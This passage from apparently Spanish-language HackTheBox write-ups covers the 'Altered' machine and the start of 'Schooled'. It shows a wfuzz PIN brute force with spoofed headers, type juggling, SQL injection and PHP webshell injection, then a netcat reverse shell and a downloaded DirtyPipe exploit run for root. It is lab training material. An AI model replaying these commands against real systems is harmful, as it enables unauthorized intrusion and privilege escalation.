<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">--hh</span><span class="o">=</span>5644 <span class="nt">-m</span> zip <span class="nt">-t</span> 200 <span class="nt">-z</span> range,0000-9999 <span class="nt">-w</span> /home/miguelrega7/Hackthebox/altered/content/IPs <span class="nt">-H</span> <span class="s2">"X-Forwarded-For: FUZ2Z"</span> <span class="nt">-d</span> <span class="s1">'name=admin&amp;pin=FUZZ'</span> <span class="nt">-H</span> <span class="s2">"Cookie: XSRF-TOKEN=eyJpdiI6ImpCWXVEcURCbGRBMUxCZ3d2SjZrSlE9PSIsInZhbHVlIjoiY09uZG1JUGhpMnZtZFlwRDMzQzd2R2hoenFlZ0JwMzJhb3VsTzR0NmRPUk8vdm5DRkszMENJMHdSUHdhRUtEU0l3Y1JJbmMzY3FyRGtHQ0pUb2FiRXU4Q0ZpdWNueEhvemgwSkE3VTNDZTBKYVhFUDNQNU9MaXV1emJlS0FBekoiLCJtYWMiOiJjY2NkM2ZlNWEzNzU3MGEyNjZkNDNlY2RmYmE2MGEyMDFjZDU4MjlmNTRhYWQ0YTU0ZDRkYzc3Mjk1MDIwYTBmIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IjZkcFJRb0VjN3NnM0czZ3hXN2t2c3c9PSIsInZhbHVlIjoiVC93OVZvNlBGZXlYTWFJaEwrMmNRalY3cExsYUNBNnBOU01vU0dDankwR1JvVHExdk0xWERmUDVMZ1QvNWxYZVFmbVBEaTJNekVKTDdNUExIcFBuenNHSUkyT1B1b3YvTUxScldNbUM5VzNaWThWWC9oWXZPUzNFZmJyYTdzZU8iLCJtYWMiOiJhODViMmZmYTFkZGRkMGFkZTE4ZDFhNWE2NWY5ZTgwOWE0ZTBlMjhiNjAxZDQyOTFhOTE1ODk5NTYxMWY2Nzc2IiwidGFnIjoiIn0%3D"</span> http://10.10.11.159/api/resettoken
<span class="k">********************************************************</span>
<span class="k">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         <span class="k">*</span>
<span class="k">********************************************************</span>

Target: http://10.10.11.159/api/resettoken
Total requests: 10000

<span class="o">=====================================================================</span>
ID           Response   Lines    Word       Chars       Payload                                        
<span class="o">=====================================================================</span>

000001052:   200        138 L    303 W      5366 Ch     <span class="s2">"1051 - 10.10.4.35"</span> 
</code></pre></div></div>

<ul>
  <li>
    <p>Tenemos un <code class="language-plaintext highlighter-rouge">PIN code</code> vamos a probarlo.</p>
  </li>
  <li>
    <p>Y bueno funciona.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/7.png" />
</p>

<ul>
  <li>Funciona.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/8.png" />
</p>

<ul>
  <li>Y bueno estamos dentro.</li>
</ul>

<h2 id="shell-as-www-data--type-juggling">Shell as www-data &amp;&amp; Type Juggling</h2>

<ul>
  <li>
    <p>Vamos a capturar con <code class="language-plaintext highlighter-rouge">Burpsuite</code> muchas peticiones a la hora de dar <code class="language-plaintext highlighter-rouge">click</code> en <code class="language-plaintext highlighter-rouge">view</code> en cada <code class="language-plaintext highlighter-rouge">profile</code> ya que no vemos nada interesante.</p>
  </li>
  <li>
    <p>Vemos que son estáticas no cambian el <code class="language-plaintext highlighter-rouge">secret</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/9.png" />
</p>

<ul>
  <li>Si cambiamos el <code class="language-plaintext highlighter-rouge">secret</code> añadiendo otro carácter nos detecta.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/10.png" />
</p>

<ul>
  <li>Si cambiamos el <code class="language-plaintext highlighter-rouge">request method</code> obtenemos la siguiente respuesta.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/11.png" />
</p>

<ul>
  <li>Si lo ponemos en <code class="language-plaintext highlighter-rouge">GET</code> manualmente obtenemos una data diferente por que si lo acepta.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/12.png" />
</p>

<ul>
  <li>Vamos a cambiar la petición a un JSON.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/13.png" />
</p>

<ul>
  <li>Si alteramos la data cambiando un valor o agregando otro nos da este error.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/14.png" />
</p>

<ul>
  <li>Lo mas probable es que por detrás se aplique una comparativa al valor del <code class="language-plaintext highlighter-rouge">secret</code> que tiene que ser exactamente ese para que funcione pero cuando se aplican comparativas usando <code class="language-plaintext highlighter-rouge">==</code> podemos poner un True y va a hacer correcto por eso mejor siempre usar un <code class="language-plaintext highlighter-rouge">===</code> <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling</a>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/15.png" />
</p>

<h2 id="sql-injection">SQL Injection</h2>

<ul>
  <li>Si añadimos una comilla en el campo <code class="language-plaintext highlighter-rouge">id</code> obtenemos un error.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/16.png" />
</p>

<ul>
  <li>Si probamos haciendo un ordenamiento para ver si es vulnerable a <code class="language-plaintext highlighter-rouge">SQLI</code> obtenemos lo mismo con o sin comilla.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/17.png" />
</p>

<ul>
  <li>Sin embargo al llegar a 3 no obtenemos un error.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/18.png" />
</p>

<ul>
  <li>Si enviamos la petición no vemos los números para poder cambiar la <code class="language-plaintext highlighter-rouge">query</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/19.png" />
</p>

<ul>
  <li>Si cambiamos el numero del id vemos que el campo que podemos escribir es en el 3.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/20.png" />
</p>

<ul>
  <li>Sabemos el nombre de la base de datos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/21.png" />
</p>

<ul>
  <li>Estas son todas las bases de datos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/22.png" />
</p>

<ul>
  <li>Vamos a ver las tablas de la base de datos <code class="language-plaintext highlighter-rouge">uhc</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/23.png" />
</p>

<ul>
  <li>Ahora las columnas.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/24.png" />
</p>

<ul>
  <li>Vemos los usuarios y sus hashes.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/25.png" />
</p>

<ul>
  <li>
    <p>Ninguna de las credenciales que obtendremos después de crackear los hashes nos funcionan para conectarnos por <code class="language-plaintext highlighter-rouge">ssh</code>.</p>
  </li>
  <li>
    <p>Pero podemos leer archivos.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/26.png" />
</p>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Podemos ver la flag.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/27.png" />
</p>

<ul>
  <li>
    <p>Algo que podemos hacer es ver si tenemos capacidad de escritura sabemos que la web corre <code class="language-plaintext highlighter-rouge">Nginx</code> y <code class="language-plaintext highlighter-rouge">PHP</code> pero necesitamos saber la ruta donde guardaría algún archivo que escribamos.</p>
  </li>
  <li>
    <p>Encontramos donde esta montada la web.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/28.png" />
</p>

<ul>
  <li>Si comprobamos vemos que es correcto.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/29.png" />
</p>

<ul>
  <li>Podemos probar escribiendo <code class="language-plaintext highlighter-rouge">test</code> en un archivo.txt en la ruta que sabemos que existe.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/30.png" />
</p>

<ul>
  <li>Pero si vamos a la web lo vemos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/31.png" />
</p>

<ul>
  <li>Como interpreta PHP vamos a inyectar código PHP.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/32.png" />
</p>

<ul>
  <li>Funciona.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/33.png" />
</p>

<ul>
  <li>Podemos ejecutar comandos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/34.png" />
</p>

<ul>
  <li>Vamos a ponernos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/altered/35.png" />
</p>

<ul>
  <li>Recibimos la shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.13] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.159] 55000
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>931<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@altered:/srv/altered/public<span class="nv">$ </span><span class="nb">whoami
whoami
</span>www-data
www-data@altered:/srv/altered/public<span class="nv">$ </span>script /dev/null <span class="nt">-c</span> bash
script /dev/null <span class="nt">-c</span> bash
Script started, file is /dev/null
www-data@altered:/srv/altered/public<span class="nv">$ </span>^Z
zsh: suspended  nc <span class="nt">-nlvp</span> 443
                                                                                                                
❯ <span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span><span class="nb">fg</span>
<span class="o">[</span>1]  + continued  nc <span class="nt">-nlvp</span> 443
                              reset xterm
ENTER
www-data@altered:/srv/altered/public<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>

<ul>
  <li>La versión de <code class="language-plaintext highlighter-rouge">kernel</code> es vulnerable <a href="https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits">https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@altered:/<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-a</span>
Linux altered 5.16.0-051600-generic <span class="c">#202201092355 SMP PREEMPT Mon Jan 10 00:21:11 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span>
www-data@altered:/<span class="nv">$ </span>lsb_release <span class="nt">-a</span>
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 20.04.4 LTS
Release:	20.04
Codename:	focal
www-data@altered:/<span class="nv">$ </span>
</code></pre></div></div>

<ul>
  <li>Nos descargamos el exploit.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/refs/heads/main/exploit-1.c
</code></pre></div></div>

<ul>
  <li>Ahora compilamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ gcc exploit-1.c <span class="nt">-o</span> exploit2 <span class="nt">-static</span>
</code></pre></div></div>

<ul>
  <li>Lo pasamos a la maquina.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@altered:/dev/shm<span class="nv">$ </span>wget http://10.10.14.24/exploit2
</code></pre></div></div>

<ul>
  <li>Lo ejecutamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@altered:/dev/shm<span class="nv">$ </span>./exploit2 
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to <span class="s2">"piped"</span>...
system<span class="o">()</span> <span class="k">function </span>call seems to have failed :<span class="o">(</span>
www-data@altered:/dev/shm<span class="nv">$ </span>./exploit2 
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to <span class="s2">"piped"</span>...
system<span class="o">()</span> <span class="k">function </span>call seems to have failed :<span class="o">(</span>
</code></pre></div></div>

<ul>
  <li>Ahora tenemos la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@altered:/dev/shm<span class="nv">$ </span>su -
<span class="nt">---</span> Welcome to PAM-Wordle! <span class="nt">---</span>

A five character <span class="o">[</span>a-z] word has been selected.
You have 6 attempts to guess the word.

After each guess you will recieve a hint which indicates:
? - what letters are wrong.
<span class="k">*</span> - what letters are <span class="k">in </span>the wrong spot.
<span class="o">[</span>a-z] - what letters are correct.

<span class="nt">---</span> Attempt 1 of 6 <span class="nt">---</span>
Word: <span class="nb">chmod
</span>Hint-&gt;??<span class="k">*</span>??
<span class="nt">---</span> Attempt 2 of 6 <span class="nt">---</span>
Word: <span class="nb">mkdir
</span>Hint-&gt;<span class="k">*</span>??<span class="k">*</span>?
<span class="nt">---</span> Attempt 3 of 6 <span class="nt">---</span>
Word: shell
Hint-&gt;??<span class="k">*</span>??
<span class="nt">---</span> Attempt 4 of 6 <span class="nt">---</span>
Word: email
Invalid guess: unknown word.
Word: cmake
Hint-&gt;?<span class="k">*</span>??e
<span class="nt">---</span> Attempt 5 of 6 <span class="nt">---</span>
Word: <span class="nb">uname
</span>Hint-&gt;u??me
<span class="nt">---</span> Attempt 6 of 6 <span class="nt">---</span>
Word: utime
Correct!
Password:
<span class="c"># whoami</span>
root
<span class="c"># cat /root/root.txt</span>
507f83d162ba9b570e5397694741787d
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/hard" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Schooled (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/10/11/schooled.html" rel="alternate" type="text/html" title="HackTheBox - Schooled (medium)" /><published>2024-10-11T00:00:00-06:00</published><updated>2024-10-11T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/10/11/schooled</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/10/11/schooled.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/3e2a599fda2f510f3a5f2146fae928ee.png" />
</p>

<ul>
  <li>Schooled is a medium difficulty FreeBSD machine that showcases two recently disclosed vulnerabilities affecting the Moodle platform (labeled CVE-2020-25627 and CVE-2020-14321), which have to be chained together in order to gain access as a <code class="language-plaintext highlighter-rouge">teacher</code> user, escalate privileges to a <code class="language-plaintext highlighter-rouge">manager</code> user and install a malicious plugin resulting in remote command execution. Cracking a hash obtained from the Moodle database allows SSH access to the system via password reuse. Privileges can then be escalated to <code class="language-plaintext highlighter-rouge">root</code> by installing a malicious package (which is possible due to <code class="language-plaintext highlighter-rouge">sudo</code> permissions and write access to the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file).</li>
</ul>

<h2 id="portscan">PortScan</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80,33060 10.10.10.234 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-10-10 17:14 CST
Nmap scan report <span class="k">for </span>10.10.10.234
Host is up <span class="o">(</span>0.18s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9 <span class="o">(</span>FreeBSD 20200214<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc <span class="o">(</span>RSA<span class="o">)</span>
|   256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp    open  http    Apache httpd 2.4.46 <span class="o">((</span>FreeBSD<span class="o">)</span> PHP/7.4.15<span class="o">)</span>
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 <span class="o">(</span>FreeBSD<span class="o">)</span> PHP/7.4.15
|_http-title: Schooled - A new kind of educational institute
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message<span class="s2">"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"</span>
|     HY000
|   oracle-tns: 
|     Invalid message-frame.<span class="s2">"
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94SVN%I=7%D=10/10%Time=67085FCF%P=x86_64-pc-linux-gnu
SF:%r(NULL,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(GenericLines,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\</span>
SF:x0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(GetRequest,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(HT
SF:TPOptions,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(RTSPRequest,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0</span>
SF:<span class="se">\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(RPCCheck,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(DNS
SF:VersionBindReqTCP,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(DNSStatusRequestT
SF:CP,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\
SF:x0fInvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a
SF:\0")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08
SF:\x01\x10\x88'</span><span class="se">\x</span>1a<span class="se">\x</span>0fInvalid<span class="se">\x</span>20message<span class="se">\"\x</span>05HY000<span class="s2">")%r(TerminalServerCo
SF:okie,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(TLSSessionReq,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>
SF:0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\x0fInvalid\x20messa
SF:ge\"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgN
SF:eg,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\
SF:x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'</span><span class="se">\x</span>1a<span class="se">\x</span>0fInvalid<span class="se">\x</span>20message<span class="se">\"\x</span>0
SF:5HY000<span class="s2">")%r(FourOhFourRequest,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(LPDStr
SF:ing,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(LDAPSearchReq,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0
SF:b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\x0fInvalid\x20messag
SF:e\"\x05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\
SF:x01\x08\x01\x10\x88'</span><span class="se">\x</span>1a<span class="se">\*</span>Parse<span class="se">\x</span>20error<span class="se">\x</span>20unserializing<span class="se">\x</span>20protobuf<span class="se">\x</span>
SF:20message<span class="se">\"\x</span>05HY000<span class="s2">")%r(SIPOptions,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r
SF:(LANDesk-RC,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(TerminalServer,9,"</span><span class="se">\x</span>05<span class="se">\</span>
SF:0<span class="se">\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(NCP,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(Not
SF:esRPC,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x
SF:1a\x0fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x
SF:05\x1a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,
SF:32,"\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'</span><span class="se">\x</span>1a<span class="se">\x</span>16Inv
SF:alid<span class="se">\x</span>20message-frame<span class="se">\.\"\x</span>05HY000<span class="s2">")%r(ms-sql-s,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>
SF:05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(afp,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01
SF:<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\x0fInvalid\x20message\"\x05HY000");
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
</span></code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Vamos a comenzar enumerando el puerto 80.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.234</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.234</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Apache</span><span class="p">[</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">46</span><span class="p">],</span> <span class="no">Bootstrap</span><span class="p">,</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">Email</span><span class="p">[</span><span class="c1">#,admissions@schooled.htb], HTML5, HTTPServer[FreeBSD][Apache/2.4.46 (FreeBSD) PHP/7.4.15], IP[10.10.10.234], PHP[7.4.15], Script, Title[Schooled - A new kind of educational institute], X-UA-Compatible[IE=edge]</span>
</code></pre></div></div>

<ul>
  <li>Esta es la pagina web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/1.png" />
</p>

<ul>
  <li>Vamos hacer <code class="language-plaintext highlighter-rouge">Fuzzing</code> para ver si encontramos algo interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ feroxbuster <span class="nt">-u</span> http://10.10.10.234
                                                                                                                
 ___  ___  __   __     __      __         __   ___
|__  |__  |__<span class="o">)</span> |__<span class="o">)</span> | /  <span class="sb">`</span>    /  <span class="se">\ \_</span>/ | |  <span class="se">\ </span>|__
|    |___ |  <span class="se">\ </span>|  <span class="se">\ </span>| <span class="se">\_</span>_,    <span class="se">\_</span>_/ / <span class="se">\ </span>| |__/ |___
by Ben <span class="s2">"epi"</span> Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.234
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout <span class="o">(</span>secs<span class="o">)</span>        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ <span class="nb">true</span>
 🏁  HTTP methods          │ <span class="o">[</span>GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press <span class="o">[</span>ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        7l       20w      199c Auto-filtering found 404-like response and created new filter<span class="p">;</span> toggle off with <span class="nt">--dont-filter</span>
404      GET        7l       23w      196c Auto-filtering found 404-like response and created new filter<span class="p">;</span> toggle off with <span class="nt">--dont-filter</span>
301      GET        7l       20w      235c http://10.10.10.234/images <span class="o">=&gt;</span> http://10.10.10.234/images/
301      GET        7l       20w      232c http://10.10.10.234/css <span class="o">=&gt;</span> http://10.10.10.234/css/
301      GET        7l       20w      231c http://10.10.10.234/js <span class="o">=&gt;</span> http://10.10.10.234/js/
200      GET       21l      138w     5935c http://10.10.10.234/images/logo_05.png
200      GET       19l      100w     5832c http://10.10.10.234/images/logo_06.png
200      GET      364l      668w     6108c http://10.10.10.234/css/responsive.css
200      GET        3l       29w    16814c http://10.10.10.234/images/favicon.ico
200      GET       24l      137w     7123c http://10.10.10.234/images/logo_03.png
200      GET       26l       53w      437c http://10.10.10.234/js/01-custom-places-example.js
200      GET       42l      306w    23349c http://10.10.10.234/images/testi_03.png
200      GET        8l      246w     8395c http://10.10.10.234/js/timeline.min.js
200      GET        4l      194w     8215c http://10.10.10.234/js/modernizer.js
200      GET       15l      114w     5619c http://10.10.10.234/images/logo_01.png
200      GET       22l      108w     5099c http://10.10.10.234/images/logo_02.png
200      GET       24l      123w     7771c http://10.10.10.234/images/logo_04.png
200      GET       36l      161w    12089c http://10.10.10.234/images/apple-touch-icon.png
200      GET       58l      283w    21484c http://10.10.10.234/images/testi_02.png
200      GET      461l     1555w    20750c http://10.10.10.234/index.html
200      GET      364l     1095w    15997c http://10.10.10.234/teachers.html
200      GET      357l     1352w    17784c http://10.10.10.234/about.html
200      GET     1911l     7282w    57523c http://10.10.10.234/js/mapsed.js
200      GET       11l      485w    52789c http://10.10.10.234/css/animate.min.css
200      GET      338l     1778w   109546c http://10.10.10.234/images/parallax_04.jpg
200      GET      509l     2620w   170217c http://10.10.10.234/images/slider-01.jpg
200      GET       84l      358w    14211c http://10.10.10.234/images/img-01.jpg
200      GET       35l      179w     5340c http://10.10.10.234/images/ajax-loader.gif
200      GET       23l      147w    12279c http://10.10.10.234/images/avatar-02.jpg
200      GET       10l       49w      575c http://10.10.10.234/images/arrow-left.svg
200      GET       10l       49w      575c http://10.10.10.234/images/arrow-right.svg
200      GET       30l      173w    11994c http://10.10.10.234/images/avatar-03.jpg
200      GET       40l      180w    13328c http://10.10.10.234/images/author.jpg
200      GET       23l      168w    11422c http://10.10.10.234/images/avatar-01.jpg
